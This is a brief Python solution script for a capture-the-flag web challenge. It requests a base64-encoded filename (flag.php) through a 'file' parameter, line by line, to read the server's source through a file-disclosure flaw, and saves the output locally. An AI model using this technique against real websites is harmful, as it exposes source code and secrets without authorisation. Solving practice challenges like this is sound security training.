'''


@author: wenhuizone
'''

import requests
import sys

cookies = {'key': 'idf'}

for i in range(0,20): 
    url="http://ctf.idf.cn/game/web/40/index.php?line="+str(i)+"&file=ZmxhZy5waHA="
    wp = requests.get(url)
    filename = "d:/index.php"
    fp = open(filename, 'a')
    print(wp.text)
    fp.write(wp.text)
    fp.close()

print("get flag success")